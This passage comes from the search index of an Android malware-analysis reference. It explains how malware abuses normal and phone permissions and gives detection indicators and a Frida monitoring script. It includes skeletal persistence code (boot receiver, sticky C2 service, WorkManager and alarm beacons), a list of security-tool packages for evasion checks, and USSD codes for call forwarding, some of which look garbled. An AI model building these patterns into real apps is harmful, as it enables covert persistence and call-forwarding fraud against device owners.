hours.</p>"},{"location":"permissions/normal/foreground-service/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\" /&gt;\n&lt;uses-permission android:name=\"android.permission.FOREGROUND_SERVICE_DATA_SYNC\" /&gt;\n</code></pre> <p>The <code>foregroundServiceType</code> in the service declaration reveals the claimed purpose. Mismatch between the declared type and actual app functionality is suspicious.</p>"},{"location":"permissions/normal/internet/","title":"INTERNET","text":"<p>Allows opening network sockets. Required by virtually all Android malware for C2 communication, data exfiltration, payload download, and inject kit retrieval. Granted silently at install time.</p>"},{"location":"permissions/normal/internet/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.INTERNET</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 1"},{"location":"permissions/normal/internet/#what-it-enables","title":"What It Enables","text":"<p>Full network access: HTTP/HTTPS requests, raw sockets, WebSocket connections, DNS queries. No restrictions on destination, port, or protocol.</p>"},{"location":"permissions/normal/internet/#relevance-to-malware","title":"Relevance to Malware","text":"<p>Every malware family that communicates with a remote server needs this permission. Without it, the malware is limited to local-only operations (which are rarely useful).</p> <p>Network functions in malware:</p> Function Usage C2 communication Receive commands, send status updates Data exfiltration Upload stolen credentials, SMS, contacts, files Payload download Fetch second-stage APKs, inject kits, configuration Inject kit retrieval Download HTML overlay templates per target app Screen streaming VNC-like remote access (Hook, Octo) Update mechanism Download updated versions of the malware"},{"location":"permissions/normal/internet/#detection-value","title":"Detection Value","text":"<p><code>INTERNET</code> alone is meaningless as an indicator since the vast majority of legitimate apps also request it. Its value is in combination: <code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> is a different story than <code>INTERNET</code> alone.</p>"},{"location":"permissions/normal/internet/#network-security-config","title":"Network Security Config","text":"<p>Apps can declare a network security configuration that controls TLS behavior:</p> <pre><code>&lt;!-- res/xml/network_security_config.xml --&gt;\n&lt;network-security-config&gt;\n    &lt;domain-config cleartextTrafficPermitted=\"true\"&gt;\n        &lt;domain includeSubdomains=\"true\"&gt;example.com&lt;/domain&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>When analyzing an app, this file reveals:</p> <ul> <li>Whether cleartext (HTTP) traffic is allowed (and to which domains)</li> <li>Custom certificate pins</li> <li>Trusted CA certificates (including user-installed certs)</li> <li>Debug-only trust overrides</li> </ul> <p>On Android 9+, cleartext traffic is blocked by default unless explicitly allowed in the network security config.</p>"},{"location":"permissions/normal/query-all-packages/","title":"QUERY_ALL_PACKAGES","text":"<p>Allows an app to see all installed packages on the device. Used by malware for reconnaissance: identifying installed banking apps (to prepare overlays), detecting security software (to avoid or disable it), and fingerprinting the device.</p>"},{"location":"permissions/normal/query-all-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.QUERY_ALL_PACKAGES</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 30 (Android 11) <p>Before Android 11, all apps could freely enumerate installed packages using <code>PackageManager.getInstalledPackages()</code>. Android 11 introduced package visibility filtering: by default, apps can only see a limited set of other apps.</p>"},{"location":"permissions/normal/query-all-packages/#what-it-enables","title":"What It Enables","text":"<p>With this permission, <code>PackageManager.getInstalledPackages()</code> returns the full list of installed apps. Without it, only apps matching the declaring app's <code>&lt;queries&gt;</code> manifest element or meeting automatic visibility criteria are returned.</p> <p>Apps can also use targeted <code>&lt;queries&gt;</code> elements instead of this broad permission:</p> <pre><code>&lt;queries&gt;\n    &lt;package android:name=\"com.target.banking.app\" /&gt;\n&lt;/queries&gt;\n</code></pre>"},{"location":"permissions/normal/query-all-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/query-all-packages/#target-list-matching","title":"Target List Matching","text":"<p>Banking trojans use installed app enumeration to determine which overlay injections to download from C2. Instead of downloading templates for all 500+ supported banks, the malware only fetches overlays for apps actually installed on the device.</p>"},{"location":"permissions/normal/query-all-packages/#security-software-detection","title":"Security Software Detection","text":"<p>Malware checks for the presence of antivirus, MDM, and security analysis tools:</p> Package Pattern Tool <code>com.avast.*</code>, <code>com.avg.*</code> Avast/AVG antivirus <code>com.bitdefender.*</code> Bitdefender <code>org.malwarebytes.*</code> Malwarebytes <code>com.lookout.*</code> Lookout <code>de.robv.android.xposed.*</code> Xposed framework <code>eu.faircode.netguard</code> NetGuard firewall <p>If detected, malware may avoid activating, attempt to uninstall the tool (via accessibility), or warn the C2 operator.</p>"},{"location":"permissions/normal/query-all-packages/#environment-detection","title":"Environment Detection","text":"<p>Checking for analysis environment indicators:</p> Package Indicates <code>com.android.vending</code> absent Non-standard ROM or emulator <code>com.google.android.gms</code> absent No Google Play Services Common emulator packages Automated analysis sandbox"},{"location":"permissions/normal/query-all-packages/#targeted-queries-alternative","title":"Targeted <code>&lt;queries&gt;</code> Alternative","text":"<p>Sophisticated malware avoids <code>QUERY_ALL_PACKAGES</code> (which triggers Play Store review scrutiny) and instead lists target packages in <code>&lt;queries&gt;</code>:</p> <pre><code>&lt;queries&gt;\n    &lt;package android:name=\"com.chase.sig.android\" /&gt;\n    &lt;package android:name=\"com.bankofamerica.cashpromobile\" /&gt;\n    &lt;package android:name=\"com.wells.fargo.mobile\" /&gt;\n&lt;/queries&gt;\n</code></pre> <p>This is less conspicuous but reveals the target list in the manifest.</p>"},{"location":"permissions/normal/query-all-packages/#android-version-changes","title":"Android Version Changes","text":"<p>Android 11 (API 30): package visibility filtering introduced. <code>QUERY_ALL_PACKAGES</code> added as the opt-out.</p> <p>Android 11+: Google Play policy restricts use of <code>QUERY_ALL_PACKAGES</code> to apps where core functionality requires it (e.g., launchers, device managers, security apps). Apps that don't justify it face rejection.</p>"},{"location":"permissions/normal/query-all-packages/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.QUERY_ALL_PACKAGES\" /&gt;\n</code></pre> <p>Or check for extensive <code>&lt;queries&gt;</code> entries listing banking/financial apps, which reveals targeting intent without needing the broad permission.</p>"},{"location":"permissions/normal/receive-boot-completed/","title":"RECEIVE_BOOT_COMPLETED","text":"<p>The primary persistence mechanism on Android. This normal-protection-level permission is granted silently at install time -- no user prompt, no settings toggle, no review hurdle. It allows an app to receive a broadcast when the device finishes booting, at which point the app can start services, schedule tasks, and establish C2 connections. Virtually every persistent Android malware uses this permission. Without it, the malware would die on reboot, requiring the user to manually re-launch it.</p>"},{"location":"permissions/normal/receive-boot-completed/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_BOOT_COMPLETED</code> Protection Level <code>normal</code> Grant Method Automatically at install time (no user interaction) Introduced API 1 User Visibility None -- not shown in permission dialogs or special access settings Play Store Policy No restrictions (extremely common in legitimate apps) <p>The <code>normal</code> protection level is the key factor. Unlike <code>dangerous</code> permissions that require runtime consent or special permissions that need user toggling in Settings, <code>RECEIVE_BOOT_COMPLETED</code> is granted the moment the APK is installed. The user has no opportunity to deny it and is never informed that the app can auto-start on boot.</p>"},{"location":"permissions/normal/receive-boot-completed/#what-it-enables","title":"What It Enables","text":"<p>The app registers a <code>BroadcastReceiver</code> for <code>ACTION_BOOT_COMPLETED</code>. After the device boots, the system delivers this broadcast to all registered receivers. The receiver then starts services, schedules alarms, or initiates any background operation.</p>"},{"location":"permissions/normal/receive-boot-completed/#boot-receiver-implementation","title":"Boot Receiver Implementation","text":"<pre><code>public class BootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {\n            Intent serviceIntent = new Intent(context, C2Service.class);\n            context.startForegroundService(serviceIntent);\n        }\n    }\n}\n</code></pre>"},{"location":"permissions/normal/receive-boot-completed/#manifest-registration","title":"Manifest Registration","text":"<pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\" /&gt;\n&lt;uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\" /&gt;\n\n&lt;receiver\n    android:name=\".BootReceiver\"\n    android:exported=\"true\"\n    android:enabled=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The <code>exported=\"true\"</code> attribute is required for the receiver to receive system broadcasts. The receiver is invoked by the system itself, not by other apps.</p>"},{"location":"permissions/normal/receive-boot-completed/#related-broadcasts","title":"Related Broadcasts","text":"<p>Malware rarely relies on <code>BOOT_COMPLETED</code> alone. For redundancy and to cover edge cases (direct boot, app updates, timezone changes), families register for multiple boot-like and system-event broadcasts:</p> Broadcast When Fired Permission Required Notes <code>ACTION_BOOT_COMPLETED</code> After full system boot and user unlock <code>RECEIVE_BOOT_COMPLETED</code> Primary persistence trigger <code>ACTION_LOCKED_BOOT_COMPLETED</code> After direct boot, before user unlock (API 24+) <code>RECEIVE_BOOT_COMPLETED</code> Runs earlier than BOOT_COMPLETED, useful for device-encrypted storage scenarios <code>ACTION_MY_PACKAGE_REPLACED</code> After the app itself is updated None Ensures malware restarts after self-update from C2 <code>ACTION_PACKAGE_REPLACED</code> After any package on device is updated None Broader trigger, fires frequently <code>ACTION_USER_PRESENT</code> After user unlocks the screen None Fires on every unlock, useful as a fallback if boot receiver was killed <code>ACTION_POWER_CONNECTED</code> When charger is connected None Frequent event, used as a wakeup trigger <code>ACTION_TIMEZONE_CHANGED</code> When device timezone changes None Obscure trigger, less likely to be filtered <code>ACTION_CONNECTIVITY_CHANGE</code> When network state changes <code>ACCESS_NETWORK_STATE</code> Fires frequently, good for re-establishing C2 after network drops <p>Registering for multiple events creates a resilient persistence net. Even if the system kills the malware's background service, the next broadcast will restart it.</p>"},{"location":"permissions/normal/receive-boot-completed/#combined-persistence-patterns","title":"Combined Persistence Patterns","text":""},{"location":"permissions/normal/receive-boot-completed/#boot-foreground-service","title":"Boot + Foreground Service","text":"<p>The standard pattern: boot receiver starts a foreground service that maintains persistent C2 connection, monitors for target apps, and keeps the malware operational:</p> <pre><code>public class C2Service extends Service {\n    @Override\n    public int onStartCommand(Intent intent, int flags, int startId) {\n        Notification notification = buildSilentNotification();\n        startForeground(1, notification);\n        connectToC2();\n        startOverlayMonitoring();\n        return START_STICKY;\n    }\n\n    @Override\n    public IBinder onBind(Intent intent) {\n        return null;\n    }\n}\n</code></pre> <p><code>START_STICKY</code> tells the system to restart the service if it is killed due to memory pressure. Combined with the boot receiver, this creates a self-healing persistence loop.</p>"},{"location":"permissions/normal/receive-boot-completed/#boot-workmanager","title":"Boot + WorkManager","text":"<p>Post-API 26 background limits make raw background services unreliable. Modern malware uses <code>WorkManager</code> for persistent scheduling that survives boot, doze mode, and app standby:</p> <pre><code>public class BootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        PeriodicWorkRequest c2Work = new PeriodicWorkRequest.Builder(\n            C2Worker.class, 15, TimeUnit.MINUTES\n        ).setConstraints(\n            new Constraints.Builder()\n                .setRequiredNetworkType(NetworkType.CONNECTED)\n                .build()\n        ).build();\n\n        WorkManager.getInstance(context)\n            .enqueueUniquePeriodicWork(\"c2\", ExistingPeriodicWorkPolicy.KEEP, c2Work);\n    }\n}\n</code></pre>"},{"location":"permissions/normal/receive-boot-completed/#boot-alarmmanager","title":"Boot + AlarmManager","text":"<p>Older pattern, still effective. <code>AlarmManager</code> schedules repeating alarms that fire even when the app is not running. Combined with boot receiver for re-scheduling after reboot:</p> <pre><code>AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);\nPendingIntent pending = PendingIntent.getBroadcast(\n    context, 0, new Intent(context, C2Receiver.class),\n    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE\n);\nalarmManager.setExactAndAllowWhileIdle(\n    AlarmManager.RTC_WAKEUP,\n    System.currentTimeMillis() + 60000,\n    pending\n);\n</code></pre> <p><code>setExactAndAllowWhileIdle</code> fires even during Doze mode (with frequency restrictions), making it useful for maintaining C2 beacons.</p>"},{"location":"permissions/normal/receive-boot-completed/#abuse-in-malware","title":"Abuse in Malware","text":"<p><code>RECEIVE_BOOT_COMPLETED</code> is foundational infrastructure -- it does not perform the attack directly but ensures the attack components survive reboots. It is present in virtually every persistent Android malware family.</p>"},{"location":"permissions/normal/receive-boot-completed/#notable-families","title":"Notable Families","text":"Family Boot Persistence Usage Source Cerberus Boot receiver restarts overlay monitoring service and C2 connection, leaked source code made this pattern widely copied ThreatFabric Hook Boot persistence for VNC-based remote access and overlay injection engine ThreatFabric GodFather Boot receiver restarts accessibility-based monitoring and WebSocket C2 channel Cyble Octo Boot-triggered foreground service for screen streaming, keylogging, and remote access ThreatFabric Medusa Boot persistence for screen recording, remote access, and SMS interception Cleafy Hydra Boot receiver re-establishes C2 connection and overlay injection service ThreatFabric SharkBot Boot persistence for ATS fraud engine and credential interception service NCC Group SpyNote Boot receiver ensures persistent RAT functionality, also registers for LOCKED_BOOT_COMPLETED F-Secure Rafel RAT Boot persistence combined with battery optimization exemption for continuous operation, found in 120+ campaigns Check Point"},{"location":"permissions/normal/receive-boot-completed/#permission-combination-as-threat-signal","title":"Permission Combination as Threat Signal","text":"<p><code>RECEIVE_BOOT_COMPLETED</code> is normal in legitimate apps (alarm clocks, messaging apps, fitness trackers). The malware signal comes from its combination with other permissions:</p> Combination Threat Pattern <code>RECEIVE_BOOT_COMPLETED</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> Boot persistence for accessibility-based attack (overlay, keylogging, ATS) <code>RECEIVE_BOOT_COMPLETED</code> + <code>SYSTEM_ALERT_WINDOW</code> + <code>INTERNET</code> Persistent overlay attack infrastructure <code>RECEIVE_BOOT_COMPLETED</code> + <code>READ_SMS</code> + <code>RECEIVE_SMS</code> + <code>INTERNET</code> Persistent SMS interception and exfiltration <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> + <code>WAKE_LOCK</code> Persistent background operation (C2 beacon, data exfiltration) <code>RECEIVE_BOOT_COMPLETED</code> + <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> Aggressive persistence -- resists Doze and app standby <code>RECEIVE_BOOT_COMPLETED</code> + <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>ACCESS_FINE_LOCATION</code> Spyware/RAT persistence (Rafel RAT, SpyNote pattern) <p>A \"utility\" app declaring <code>RECEIVE_BOOT_COMPLETED</code> alongside accessibility or overlay permissions should be treated as suspicious by default. See the MITRE ATT&amp;CK Mobile technique T1624.001: Event Triggered Execution - Broadcast Receivers for the formal taxonomy.</p>"},{"location":"permissions/normal/receive-boot-completed/#android-version-changes","title":"Android Version Changes","text":""},{"location":"permissions/normal/receive-boot-completed/#android-31-api-12","title":"Android 3.1 (API 12)","text":"<p>Apps in \"stopped state\" (freshly installed, never opened by the user) do not receive <code>BOOT_COMPLETED</code>. The user must launch the app at least once. This prevents malware from activating purely through silent installation, but all sideloading-based attacks involve social engineering to open the app immediately after install, making this a trivial hurdle in practice.</p>"},{"location":"permissions/normal/receive-boot-completed/#android-80-api-26","title":"Android 8.0 (API 26)","text":"<p>Background execution limits. Apps targeting API 26+ cannot start background services from broadcast receivers. <code>BOOT_COMPLETED</code> receivers still fire, but they must use <code>startForegroundService()</code> instead of <code>startService()</code>. The foreground service must show a notification within 5 seconds. Malware adapted by creating minimal/silent notifications (low-priority channels, empty titles) or using <code>WorkManager</code> for scheduled tasks that do not require a visible notification.</p>"},{"location":"permissions/normal/receive-boot-completed/#android-12-api-31","title":"Android 12 (API 31)","text":"<p>Foreground service launch restrictions from the background. Apps cannot start foreground services while in the background except from specific allowed contexts -- and <code>BOOT_COMPLETED</code> receivers are one of those exempted contexts. This means the boot receiver remains a reliable way to start foreground services, even on Android 12+.</p>"},{"location":"permissions/normal/receive-boot-completed/#android-13-api-33","title":"Android 13 (API 33)","text":"<p><code>FOREGROUND_SERVICE</code> types must be declared in the manifest. Malware must specify the <code>foregroundServiceType</code> attribute (e.g., <code>dataSync</code>, <code>location</code>, <code>mediaPlayback</code>). This adds a static analysis indicator but does not prevent the technique -- malware simply declares an appropriate type.</p>"},{"location":"permissions/normal/receive-boot-completed/#android-14-api-34","title":"Android 14 (API 34)","text":"<p>Additional restrictions on implicit broadcasts for apps targeting API 34. However, <code>BOOT_COMPLETED</code> is a protected broadcast sent by the system and remains deliverable to statically registered receivers. The <code>FOREGROUND_SERVICE_DATA_SYNC</code> type now requires the <code>FOREGROUND_SERVICE_DATA_SYNC</code> permission (normal protection level, auto-granted).</p>"},{"location":"permissions/normal/receive-boot-completed/#frida-monitoring-script","title":"Frida Monitoring Script","text":"<p>Monitor boot receiver registrations and service starts triggered by boot:</p> <pre><code>Java.perform(function () {\n    var BroadcastReceiver = Java.use(\"android.content.BroadcastReceiver\");\n\n    BroadcastReceiver.onReceive.implementation = function (context, intent) {\n        var action = intent.getAction();\n        if (action !== null) {\n            var bootActions = [\n                \"android.intent.action.BOOT_COMPLETED\",\n                \"android.intent.action.LOCKED_BOOT_COMPLETED\",\n                \"android.intent.action.MY_PACKAGE_REPLACED\",\n                \"android.intent.action.USER_PRESENT\",\n                \"android.intent.action.QUICKBOOT_POWERON\"\n            ];\n            for (var i = 0; i &lt; bootActions.length; i++) {\n                if (action === bootActions[i]) {\n                    console.log(\"[Boot] Receiver triggered: \" + this.getClass().getName());\n                    console.log(\"  action: \" + action);\n                    break;\n                }\n            }\n        }\n        this.onReceive(context, intent);\n    };\n\n    var ContextWrapper = Java.use(\"android.content.ContextWrapper\");\n\n    ContextWrapper.startForegroundService.implementation = function (intent) {\n        var component = intent.getComponent();\n        console.log(\"[Service] startForegroundService called\");\n        if (component !== null) {\n            console.log(\"  target: \" + component.getClassName());\n        }\n        return this.startForegroundService(intent);\n    };\n\n    ContextWrapper.startService.implementation = function (intent) {\n        var component = intent.getComponent();\n        console.log(\"[Service] startService called\");\n        if (component !== null) {\n            console.log(\"  target: \" + component.getClassName());\n        }\n        return this.startService(intent);\n    };\n});\n</code></pre>"},{"location":"permissions/normal/receive-boot-completed/#detection-indicators","title":"Detection Indicators","text":"<p>Manifest signals:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\" /&gt;\n\n&lt;receiver android:name=\".BootReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Escalated indicators (multiple boot-like receivers):</p> <pre><code>&lt;receiver android:name=\".PersistReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n        &lt;action android:name=\"android.intent.action.LOCKED_BOOT_COMPLETED\" /&gt;\n        &lt;action android:name=\"android.intent.action.MY_PACKAGE_REPLACED\" /&gt;\n        &lt;action android:name=\"android.intent.action.USER_PRESENT\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Multiple boot-like actions in a single receiver's intent filter is a strong malware signal -- legitimate apps rarely need to cover this many restart triggers.</p> <p>Static analysis targets:</p> <ul> <li>Boot receiver classes that immediately start a <code>Service</code> or <code>ForegroundService</code></li> <li><code>START_STICKY</code> return value in <code>onStartCommand()</code> (service auto-restart)</li> <li><code>AlarmManager.setExactAndAllowWhileIdle()</code> scheduled from boot receiver</li> <li><code>WorkManager.enqueueUniquePeriodicWork()</code> called from boot receiver</li> <li><code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> alongside boot completion (aggressive persistence)</li> <li><code>PowerManager.WakeLock</code> acquisition in boot receiver chain</li> </ul> <p>See also: Persistence Techniques | C2 Communication</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/","title":"REQUEST_IGNORE_BATTERY_OPTIMIZATIONS","text":"<p>Allows requesting exemption from Android's battery optimization (Doze mode). When granted, the app's background processes are not restricted by the system, allowing persistent operation. Used by malware to maintain C2 connections and background monitoring without being killed by the OS.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> Protection Level <code>normal</code> Grant Method Automatically at install time (to request), user confirms via dialog Introduced API 23 (Android 6.0) <p>The permission allows the app to show a system dialog asking the user to whitelist it from battery optimization. The user must confirm.</p> <pre><code>Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);\nintent.setData(Uri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);\n</code></pre>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/request-ignore-battery-optimizations/#persistence","title":"Persistence","text":"<p>Battery optimization (Doze mode) kills background processes to save battery. Malware needs to stay alive for:</p> <ul> <li>Maintaining C2 connections</li> <li>Monitoring for target apps (overlay timing)</li> <li>SMS interception</li> <li>Continuous data exfiltration</li> </ul> <p>Without this exemption, the OS may kill the malware's background service after minutes of inactivity.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#social-engineering","title":"Social Engineering","text":"<p>Malware presents fake dialogs before the system prompt: \"This app requires battery optimization disabled to function properly.\" The user sees the malware's explanation, then the system dialog, and clicks \"Allow.\"</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): Doze mode introduced. This permission added.</p> <p>Android 7.0 (API 24): Doze mode becomes more aggressive (activates even when device is moving).</p> <p>Android 13+: Google Play restricts apps that request this without justification.</p>"},{"location":"permissions/normal/request-ignore-battery-optimizations/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\" /&gt;\n</code></pre> <p>Combined with <code>RECEIVE_BOOT_COMPLETED</code>, <code>FOREGROUND_SERVICE</code>, and <code>INTERNET</code>, this completes a persistence stack: boot start, foreground service, battery exemption, network access.</p>"},{"location":"permissions/normal/wake-lock/","title":"WAKE_LOCK","text":"<p>Allows preventing the CPU from sleeping. Used by malware to ensure background operations complete without the device entering deep sleep, particularly during data exfiltration, C2 polling, or on-device fraud operations.</p>"},{"location":"permissions/normal/wake-lock/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WAKE_LOCK</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 1"},{"location":"permissions/normal/wake-lock/#what-it-enables","title":"What It Enables","text":"<pre><code>PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);\nPowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"malware:wakelock\");\nwl.acquire();\n</code></pre> <p>Wake lock types:</p> Type Keeps On <code>PARTIAL_WAKE_LOCK</code> CPU only (screen off, keyboard off) <code>SCREEN_DIM_WAKE_LOCK</code> CPU + screen dim (deprecated API 17) <code>SCREEN_BRIGHT_WAKE_LOCK</code> CPU + screen bright (deprecated API 17) <code>FULL_WAKE_LOCK</code> CPU + screen + keyboard (deprecated API 17) <p><code>PARTIAL_WAKE_LOCK</code> is the only non-deprecated type and the one malware uses: it keeps the CPU running while the screen stays off, so the user doesn't notice.</p>"},{"location":"permissions/normal/wake-lock/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/normal/wake-lock/#background-operation-completion","title":"Background Operation Completion","text":"<p>Ensure long-running tasks complete:</p> <ul> <li>Large data uploads (contact database, SMS history, file exfiltration)</li> <li>Screen recording and streaming</li> <li>Cryptocurrency mining (rare on mobile)</li> <li>ATS fraud sequences that take multiple steps</li> </ul>"},{"location":"permissions/normal/wake-lock/#supporting-role","title":"Supporting Role","text":"<p><code>WAKE_LOCK</code> is a supporting permission. It rarely appears alone. Combined with <code>FOREGROUND_SERVICE</code>, <code>RECEIVE_BOOT_COMPLETED</code>, and <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code>, it forms the complete persistence and background execution stack.</p>"},{"location":"permissions/normal/wake-lock/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WAKE_LOCK\" /&gt;\n</code></pre> <p>Extremely common in legitimate apps (messaging, media, alarm). Not a useful indicator alone. Value is in combination with other persistence and exfiltration permissions.</p>"},{"location":"permissions/phone/","title":"Phone Permissions","text":"<p>Phone permissions expose telephony state, hardware identifiers, and call control. This group leaks IMEI, IMSI, carrier info, and phone number. It also enables initiating calls, answering inbound calls, and managing voicemail and SIP sessions without user interaction.</p> <p>Before Android 10, <code>READ_PHONE_STATE</code> alone was enough to harvest persistent device identifiers. Combined with <code>CALL_PHONE</code>, malware can dial premium numbers or execute USSD codes that modify carrier settings, drain prepaid balance, or forward calls to attacker-controlled numbers.</p>"},{"location":"permissions/phone/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_PHONE_STATE IMEI/IMSI harvesting, device fingerprinting, call state monitoring READ_PHONE_NUMBERS Victim phone number extraction for account linking CALL_PHONE Premium number dialing, USSD code execution, call fraud ANSWER_PHONE_CALLS Intercept incoming calls, auto-answer for eavesdropping ADD_VOICEMAIL Inject voicemail entries, social engineering via fake messages USE_SIP SIP-based call interception, VoIP abuse ACCEPT_HANDOVER Hijack ongoing calls from one app to another"},{"location":"permissions/phone/#play-store-policy","title":"Play Store Policy","text":"<p>Google restricts phone and call log permissions under the same policy as SMS (January 2019). Apps must be declared as the default dialer or phone handler, or demonstrate an approved core use case. This restriction pushed identifier-harvesting malware toward sideloading and alternative distribution channels.</p>"},{"location":"permissions/phone/#common-combinations","title":"Common Combinations","text":"Combo Purpose <code>READ_PHONE_STATE</code> + <code>INTERNET</code> Device fingerprint exfiltration <code>CALL_PHONE</code> + <code>READ_CONTACTS</code> Automated calls to victim's contact list <code>READ_PHONE_STATE</code> + <code>READ_SMS</code> + <code>RECEIVE_SMS</code> Full telephony surveillance with OTP interception <code>ANSWER_PHONE_CALLS</code> + <code>RECORD_AUDIO</code> Call interception with recording"},{"location":"permissions/phone/#families-by-phone-permission-abuse","title":"Families by Phone Permission Abuse","text":"Family Primary Phone Permissions Technique Fakecalls <code>CALL_PHONE</code>, <code>ANSWER_PHONE_CALLS</code> Banking trojan that intercepts outbound calls to bank customer service numbers. When the victim dials their bank, the malware drops the real call and connects to an attacker-operated call center instead. Also auto-answers inbound calls from the attacker to deliver vishing scripts. SpyNote (CypherRat) <code>READ_PHONE_STATE</code> Device fingerprinting via IMEI, IMSI, and carrier info. Uses telephony identifiers to track victims across reinstalls and associate stolen data with specific devices. BRATA <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code> Dials premium numbers for revenue, reads phone state to detect active calls and avoid interrupting ongoing conversations that might alert the victim. Cerberus <code>READ_PHONE_STATE</code>, <code>CALL_PHONE</code> Harvests device identifiers for victim tracking, can initiate calls to premium numbers. Pegasus <code>READ_PHONE_STATE</code>, <code>ANSWER_PHONE_CALLS</code> Full telephony surveillance -- harvests all identifiers, monitors call state, and can silently answer calls for ambient listening."},{"location":"permissions/phone/#ussd-code-execution-via-call_phone","title":"USSD Code Execution via CALL_PHONE","text":"<p><code>CALL_PHONE</code> is not limited to voice calls. It can dial USSD (Unstructured Supplementary Service Data) codes that execute carrier-side commands without any user interaction beyond the initial permission grant:</p> USSD Pattern Effect <code>tel:*%2321%23</code> (<code>*#*#</code>) Factory reset on some devices -- wipes all user data <code>tel:**21*[number]%23</code> Unconditional call forwarding -- redirects all incoming calls to attacker's number <code>tel:**62*[number]%23</code> Forward on not reachable -- catches calls when victim's phone is off or out of range <code>tel:*%23*%23</code> prefixed codes Various device/carrier diagnostic and configuration commands <p>Call forwarding via USSD is particularly dangerous in financial fraud. The attacker forwards the victim's calls to their own number, then initiates a password reset on the victim's bank account. When the bank calls to verify, the attacker answers and confirms the reset. The victim never sees the incoming call.</p>"},{"location":"permissions/phone/#imei-harvesting-deprecation","title":"IMEI Harvesting Deprecation","text":"<p>Android 10 (API 29) was a turning point for device fingerprinting. <code>getDeviceId()</code>, <code>getImei()</code>, and <code>getSimSerialNumber()</code> now return <code>null</code> for apps targeting API 29+ unless the app holds <code>READ_PRIVILEGED_PHONE_STATE</code>, a signature-level permission reserved for system apps.</p> <p>Malware families adapted with alternative identifiers:</p> Identifier Access Method Persistence <code>ANDROID_ID</code> <code>Settings.Secure</code> -- no permission needed Resets on factory reset, unique per app signing key Google Advertising ID Play Services API -- no permission needed User-resettable, but most users never reset it <code>Build.SERIAL</code> Deprecated in API 26, requires <code>READ_PHONE_STATE</code> in 26-28, inaccessible in 29+ Persistent across resets on some devices Hardware MAC Randomized since Android 10 for Wi-Fi scans Unreliable for tracking <code>MediaDrm</code> device ID <code>MediaDrm</code> API -- no permission needed Persistent, hard to reset, widely used by modern malware <p>The <code>MediaDrm</code> Widevine device ID has become the preferred fingerprint for post-Android 10 malware. It requires no permissions, survives app reinstalls, and is consistent across apps on the same device.</p>"},{"location":"permissions/phone/accept-handover/","title":"ACCEPT_HANDOVER","text":"<p>Allows an app to accept a call handover from another calling app. Part of the telecom framework for transferring active calls between different calling apps or from a cellular call to a VoIP app.</p>"},{"location":"permissions/phone/accept-handover/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCEPT_HANDOVER</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 28 (Android 